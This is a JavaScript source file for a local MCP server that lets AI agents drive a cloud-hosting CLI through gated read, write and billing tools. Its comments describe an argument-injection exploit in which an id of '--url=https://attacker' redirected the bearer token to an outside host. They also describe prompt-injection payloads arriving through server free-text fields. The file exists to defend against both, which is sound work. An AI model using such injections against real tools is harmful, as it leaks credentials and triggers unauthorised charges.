// `dcxv mcp` — a local Model Context Protocol server over stdio, so an MCP-aware
// agent (Claude Code, Claude Desktop, etc.) can use the same already-authenticated
// CLI session a human already set up with `dcxv login`. No hosted endpoint, no OAuth
// server: this process runs AS the logged-in user, on their own machine, so there is
// no unauthenticated public surface to secure in the first place.
//
// Hand-rolled newline-delimited JSON-RPC 2.0 rather than the official MCP SDK, to keep
// the CLI's single-dependency, single-binary shape (package.json has exactly two deps,
// graphql-sse and ws, and ships as a `bun build --compile` binary per platform).
//
// Tools are argv recipes run in-process through the SAME `run(argv, deps)` entry point
// bin/dcxv.js uses — no command logic is duplicated — and always with --json, so the
// result is parsed JSON, not a screen-scrape of colored text.
//
// Model-supplied values ARE argv here, so two things keep them from being read as flags
// (cli.js's parse() is parseArgs with allowPositionals + strict:false, which honors an
// option wherever it appears in the array, not just up front):
//
//   1. runJson() splits argv into `cmd` (tokens the tool itself writes) and `rest`
//      (everything from the model), and emits them as `...cmd, '--', ...rest`. After
//      `--` parseArgs stops interpreting options entirely, so a value like
//      "--url=https://attacker" lands in positionals as that literal string.
//   2. validateArgs() enforces each tool's own declared inputSchema — type, enum and
//      pattern — before run() is reached, so such a value never gets that far.
//
// This used to claim "no model-supplied argument ever reaches a handler as raw argv",
// which was simply untrue: `get_order {id: "--url=https://attacker"}` set the global
// --url flag and sent the account's bearer token to that host.
import { createInterface } from 'node:readline'
import { run } from './cli.js'
import { VERSION } from './version.js'

// Real stdio wiring for bin/dcxv.js / cli.js's `mcp` dispatch case. Kept separate from
// runMcpServer() below so tests can pass a fake `io` (an array of canned lines, an
// array collecting writes) without touching process.stdin/stdout - readline over a real
// TTY/pipe isn't something a unit test should have to fake.
export function defaultStdioIo() {
  return {
    out: (line) => process.stdout.write(line + '\n'),
    lines: () => createInterface({ input: process.stdin, terminal: false }),
  }
}

// The only flags a tool is allowed to put in its own `cmd` — everything `create_order`
// needs, and nothing that redirects the request (--url) or switches account (--profile).
// Anything else with a leading dash means a model value was passed as `cmd` instead of
// `rest`, which is the bug this whole split exists to prevent.
const TOOL_FLAGS = new Set(['--cluster', '--vcpu', '--ram', '--disk', '--ip', '--os', '--hostname', '--yes', '--price'])

// Runs one CLI command in-process and returns its parsed --json output (or throws the
// message dcxv would have printed to stderr on failure).
//
//   cmd  - fixed tokens the tool itself writes: the subcommand plus its own flags. A
//          model value may appear here ONLY as a flag's value (`--cluster 16`), which
//          parseArgs consumes as a value even when it looks like an option.
//   rest - model-supplied positionals. Emitted after `--`, where option parsing is off.
//
// --url/--profile are pinned on EVERY call, not just when `dcxv mcp` was invoked with
// them, so each tool call resolves the SAME account/host the server started against.
// Previously they were appended only if set, and only last-wins made an injected --url
// lose; with a bare `dcxv mcp` there was nothing to append and the injected one won.
// (The original bug this pinning was written for: `dcxv mcp --url <other-host>` still
// answered from the default profile's account.)
async function runJson(ctx, cmd, rest = []) {
  const bad = cmd.find((a) => typeof a === 'string' && a.startsWith('-') && !TOOL_FLAGS.has(a))
  if (bad !== undefined) throw new Error(`refusing to run: "${bad}" would be parsed as a flag`)

  const out = []
  const err = []
  const fullArgv = ['--json', '--url', ctx.baseUrl, '--profile', ctx.profileName, ...cmd]
  if (rest.length) fullArgv.push('--', ...rest.map(String))
  const code = await run(fullArgv, { ...ctx.deps, stdout: (s) => out.push(s), stderr: (s) => err.push(s) })
  if (code !== 0) throw new Error(err.join('\n') || 'command failed')
  const text = out.join('\n').trim()
  return text ? JSON.parse(text) : null
}

function textResult(value) {
  return { content: [{ type: 'text', text: typeof value === 'string' ? value : JSON.stringify(value, null, 2) }] }
}
function errorResult(message) {
  return { content: [{ type: 'text', text: message }], isError: true }
}

// Shapes the CLI already assumes downstream, written down where they can be enforced:
// handleGet/handleSet do Number(id) (cli.js), so a product id is digits and nothing else.
const ID = '^[0-9]+$'
// One DNS label or a dotted name; never starts with a dash, which is the whole point.
const HOSTNAME = '^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?(\\.[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*$'
// An OS name from list_os ("Ubuntu 24.04") or its numeric id.
const OS_NAME = '^[A-Za-z0-9][A-Za-z0-9 ._/-]{0,63}$'
// A public catalog productID. Not argv-bound (it goes through encodeURIComponent into a
// URL path) — this is hygiene, not the injection fix.
const CATALOG_ID = '^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$'

const clip = (v) => { const s = String(v); return s.length > 60 ? s.slice(0, 57) + '...' : s }

// Enforce the tool's OWN declared inputSchema before its run() is reached. The schema is
// already sent to the model in tools/list; until now only `required` was checked, so
// `enum` and every implied shape were documentation an agent could simply ignore — and
// an ignored shape is what turned get_order's id into a --url override.
//
// Deliberately not a general JSON Schema implementation: only the keywords these tools
// actually declare (type/enum/pattern), so there is nothing to get subtly wrong.
function validateArgs(tool, args) {
  const schema = tool.inputSchema || {}
  const props = schema.properties || {}

  const missing = (schema.required || []).filter((k) => args[k] === undefined || args[k] === null || args[k] === '')
  if (missing.length) return `Missing required argument(s): ${missing.join(', ')}.`

  for (const [key, spec] of Object.entries(props)) {
    const v = args[key]
    if (v === undefined || v === null) continue
    const bad = (why) => `Invalid argument "${key}": ${why} (got ${JSON.stringify(clip(v))}).`

    if (spec.type === 'boolean') {
      if (typeof v !== 'boolean') return bad('must be true or false, not a string')
      continue
    }
    if (spec.type === 'string') {
      // A number where a string is declared is a normal agent slip, not an attack - the
      // digits are equivalent once stringified, so coerce rather than reject.
      if (typeof v === 'number' && Number.isFinite(v)) args[key] = String(v)
      else if (typeof v !== 'string') return bad('must be a string')
    }
    const s = args[key]
    if (spec.enum && !spec.enum.includes(s)) return bad(`must be one of: ${spec.enum.join(', ')}`)
    if (spec.pattern && !new RegExp(spec.pattern).test(s)) return bad(`must match ${spec.pattern}`)
  }
  return null
}

// --- Public tools: no login required, plain fetch against dcxv-www's own published,
// already-tested JSON endpoints (the same ones documented at /openapi.json) rather than
// a second GraphQL implementation of catalog search. -----------------------------------

async function fetchJson(baseUrl, path) {
  const res = await fetch(`${baseUrl}${path}`)
  if (!res.ok) throw new Error(`HTTP ${res.status} fetching ${path}`)
  return res.json()
}

const PUBLIC_TOOLS = [
  {
    name: 'search_products',
    description: 'Search the DCXV public product catalog (cloud/dedicated/GPU servers, Kubernetes, IPv4 brokerage, and solution packages) by a keyword. No login required.',
    inputSchema: { type: 'object', properties: { query: { type: 'string', description: 'Optional keyword to filter by name/category/description' } } },
    run: async (args, { baseUrl }) => {
      const { products } = await fetchJson(baseUrl, '/catalog.json')
      const q = (args.query || '').toLowerCase()
      const filtered = q
        ? products.filter((p) => [p.name, p.category, p.description].some((s) => (s || '').toLowerCase().includes(q)))
        : products
      return textResult(filtered)
    },
  },
  {
    name: 'get_product',
    description: 'Get a single DCXV product by its stable id (productID). No login required.',
    inputSchema: { type: 'object', properties: { id: { type: 'string', pattern: CATALOG_ID } }, required: ['id'] },
    run: async (args, { baseUrl }) => textResult(await fetchJson(baseUrl, `/catalog/products/${encodeURIComponent(args.id)}.json`)),
  },
  {
    name: 'list_locations',
    description: 'List DCXV data center locations. No login required.',
    inputSchema: { type: 'object', properties: {} },
    run: async (_args, { baseUrl }) => textResult(await fetchJson(baseUrl, '/catalog/locations.json')),
  },
]

// --- Authenticated, read-only tools: default tier once `dcxv login` has run. --------

const READ_TOOLS = [
  {
    name: 'whoami',
    description: 'The authenticated DCXV account: name, email, balance.',
    inputSchema: { type: 'object', properties: {} },
    run: async (_a, ctx) => textResult(await runJson(ctx, ['whoami'])),
  },
  {
    name: 'get_account',
    description: 'Full account profile (organization, address, currency, payment methods). Read-only - does not change anything.',
    inputSchema: { type: 'object', properties: {} },
    run: async (_a, ctx) => textResult(await runJson(ctx, ['account', 'show'])),
  },
  {
    name: 'balance',
    description: 'Current account balance and accepted payment methods.',
    inputSchema: { type: 'object', properties: {} },
    run: async (_a, ctx) => textResult(await runJson(ctx, ['balance'])),
  },
  {
    name: 'list_orders',
    description: 'List every server/product on the authenticated account.',
    inputSchema: { type: 'object', properties: {} },
    run: async (_a, ctx) => textResult(await runJson(ctx, ['orders'])),
  },
  {
    name: 'get_order',
    description: 'Full details for one product by id: specs, status, access info. Optional action narrows to a sub-view (ips, stats, snapshots, backups, iso, kubeconfig).',
    inputSchema: {
      type: 'object',
      properties: {
        id: { type: 'string', pattern: ID, description: 'Product id, from list_orders' },
        action: { type: 'string', enum: ['ips', 'stats', 'snapshots', 'backups', 'iso', 'kubeconfig'] },
      },
      required: ['id'],
    },
    run: async (args, ctx) => textResult(await runJson(ctx, ['get'], [args.id, ...(args.action ? [args.action] : [])])),
  },
  {
    name: 'list_os',
    description: 'Available operating system images for ordering a new cloud server.',
    inputSchema: { type: 'object', properties: {} },
    run: async (_a, ctx) => textResult(await runJson(ctx, ['os'])),
  },
  {
    name: 'list_clusters',
    description: 'Cloud cluster/price-tier catalog (data center locations available for a new cloud order).',
    inputSchema: { type: 'object', properties: {} },
    run: async (_a, ctx) => textResult(await runJson(ctx, ['clusters'])),
  },
  {
    name: 'list_transactions',
    description: 'Billing/transaction history for the authenticated account.',
    inputSchema: { type: 'object', properties: {} },
    run: async (_a, ctx) => textResult(await runJson(ctx, ['tx'])),
  },
]

// --- --allow-write: reversible, non-financial actions only. Never `reinstall`
// (destroys data) or anything that charges the account - see the billing tier below. --

const WRITE_TOOLS = [
  {
    name: 'set_power',
    description: 'Power action on a server: start, stop, shutdown, reset/restart/reboot, or pass (reset the initial password). Reversible, does not charge the account.',
    inputSchema: {
      type: 'object',
      properties: {
        id: { type: 'string', pattern: ID },
        action: { type: 'string', enum: ['start', 'stop', 'shutdown', 'reset', 'restart', 'reboot', 'pass'] },
      },
      required: ['id', 'action'],
    },
    run: async (args, ctx) => textResult(await runJson(ctx, ['set'], [args.id, 'power', args.action])),
  },
  {
    name: 'rename_order',
    description: "Change a server's hostname label. Cosmetic only, does not charge the account.",
    inputSchema: { type: 'object', properties: { id: { type: 'string', pattern: ID }, hostname: { type: 'string', pattern: HOSTNAME } }, required: ['id', 'hostname'] },
    run: async (args, ctx) => textResult(await runJson(ctx, ['set'], [args.id, 'rename', args.hostname])),
  },
  {
    name: 'lock_order',
    description: 'Lock a server against changes (client-side lock, reversible with unlock_order).',
    inputSchema: { type: 'object', properties: { id: { type: 'string', pattern: ID } }, required: ['id'] },
    run: async (args, ctx) => textResult(await runJson(ctx, ['set'], [args.id, 'lock'])),
  },
  {
    name: 'unlock_order',
    description: 'Reverse lock_order.',
    inputSchema: { type: 'object', properties: { id: { type: 'string', pattern: ID } }, required: ['id'] },
    run: async (args, ctx) => textResult(await runJson(ctx, ['set'], [args.id, 'unlock'])),
  },
]

// --- --allow-billing (+ DCXV_MCP_ALLOW_BILLING=1): anything that debits the account
// immediately, with no undo. Double-gated on purpose: a prompt-injection payload can
// reach this surface through free-text fields the read-only tools above return
// verbatim (hostname, client_notes, notice_to_client), so a single flag is not enough. -

const BILLING_TOOLS = [
  {
    name: 'create_order',
    description: 'Order a new cloud server. Without confirm:true this only checks the authoritative price (no order is created, nothing is charged) - the same "dry run unless --yes" behavior as `dcxv order`.',
    inputSchema: {
      type: 'object',
      properties: {
        cluster: { type: 'string', pattern: ID, description: 'Location id from list_clusters' },
        vcpu: { type: 'string', pattern: ID },
        ram: { type: 'string', pattern: ID },
        disk: { type: 'string', pattern: ID },
        ip: { type: 'string', pattern: ID },
        os: { type: 'string', pattern: OS_NAME, description: 'OS name from list_os' },
        hostname: { type: 'string', pattern: HOSTNAME },
        confirm: { type: 'boolean', description: 'Must be true to actually place the order and charge the account; otherwise this is a price check only.' },
      },
      required: ['cluster', 'vcpu', 'ram', 'disk', 'ip', 'os'],
    },
    run: async (args, ctx) => {
      const argv = ['order', '--cluster', args.cluster, '--vcpu', args.vcpu, '--ram', args.ram, '--disk', args.disk, '--ip', args.ip, '--os', args.os]
      if (args.hostname) argv.push('--hostname', args.hostname)
      argv.push(args.confirm === true ? '--yes' : '--price')
      return textResult(await runJson(ctx, argv))
    },
  },
  {
    name: 'renew_order',
    description: 'Renew a server immediately. Charges the account with no undo.',
    inputSchema: { type: 'object', properties: { id: { type: 'string', pattern: ID } }, required: ['id'] },
    run: async (args, ctx) => textResult(await runJson(ctx, ['set'], [args.id, 'renew'])),
  },
]

// Never exposed at any gate: rm (deletes a server), pay, account set/export, sub login,
// watch (long-lived stream, doesn't fit a synchronous tool call). Simply never defined
// as tools - there is no flag combination that makes them appear in tools/list.

function toolsForFlags(flags) {
  const tools = [...PUBLIC_TOOLS, ...READ_TOOLS]
  if (flags.allowWrite) tools.push(...WRITE_TOOLS)
  if (flags.allowWrite && flags.allowBilling && process.env.DCXV_MCP_ALLOW_BILLING === '1') tools.push(...BILLING_TOOLS)
  return tools
}

function jsonRpcResult(id, result) {
  return { jsonrpc: '2.0', id, result }
}
function jsonRpcError(id, code, message) {
  return { jsonrpc: '2.0', id, error: { code, message } }
}

// deps: { config, makeClient } — the same real modules bin/dcxv.js wires in, or a test
// double with the same shape.
export async function runMcpServer(deps, flags, io) {
  const cfg = deps.config.loadConfig({ profile: flags.profile })
  const baseUrl = flags.url ? flags.url.replace(/\/+$/, '') : cfg.url
  // Host and profile resolved ONCE at startup and pinned onto every runJson() call below
  // (see its own comment) - without this, --url/--profile given to `dcxv mcp` only
  // affected the token-presence check here and silently reverted to the default
  // profile/host for every tool call. cfg.profile is the resolved name (never empty),
  // so this pins the account even when `dcxv mcp` was given no --profile at all.
  const ctx = { deps, baseUrl, profileName: cfg.profile }
  const tools = toolsForFlags(flags)
  const byName = new Map(tools.map((t) => [t.name, t]))

  const write = (obj) => io.out(JSON.stringify(obj))

  async function handle(req) {
    const { id, method, params } = req
    if (method === 'notifications/initialized') return // notification, no response
    if (method === 'ping') return write(jsonRpcResult(id, {}))
    if (method === 'initialize') {
      return write(jsonRpcResult(id, {
        protocolVersion: params?.protocolVersion || '2024-11-05',
        capabilities: { tools: {} }, // never claim resources/prompts - not implemented
        serverInfo: { name: 'dcxv', version: VERSION },
      }))
    }
    if (method === 'tools/list') {
      return write(jsonRpcResult(id, {
        tools: tools.map((t) => ({ name: t.name, description: t.description, inputSchema: t.inputSchema })),
      }))
    }
    if (method === 'tools/call') {
      const tool = byName.get(params?.name)
      if (!tool) return write(jsonRpcResult(id, errorResult(`Unknown tool "${params?.name}".`)))
      if (READ_TOOLS.includes(tool) || WRITE_TOOLS.includes(tool) || BILLING_TOOLS.includes(tool)) {
        if (!cfg.token) return write(jsonRpcResult(id, errorResult('Not logged in. Run "dcxv login" first.')))
      }
      // The declared inputSchema is otherwise descriptive-only - an agent that violates
      // its own tool's schema (calls get_product with no id, or passes "--url=..." where
      // a product id belongs) would previously reach a real request built from it,
      // rather than failing fast locally. validateArgs also normalizes in place, so pass
      // the SAME object to run() rather than re-reading params.arguments.
      const args = params?.arguments || {}
      const invalid = validateArgs(tool, args)
      if (invalid) return write(jsonRpcResult(id, errorResult(invalid)))
      try {
        return write(jsonRpcResult(id, await tool.run(args, ctx)))
      } catch (e) {
        return write(jsonRpcResult(id, errorResult(e.message || String(e))))
      }
    }
    return write(jsonRpcError(id, -32601, `Method not found: ${method}`))
  }

  for await (const line of io.lines()) {
    if (!line.trim()) continue
    let req
    try {
      req = JSON.parse(line)
    } catch {
      write(jsonRpcError(null, -32700, 'Parse error'))
      continue
    }
    try {
      await handle(req)
    } catch (e) {
      write(jsonRpcError(req?.id ?? null, -32603, e.message || String(e)))
    }
  }
}
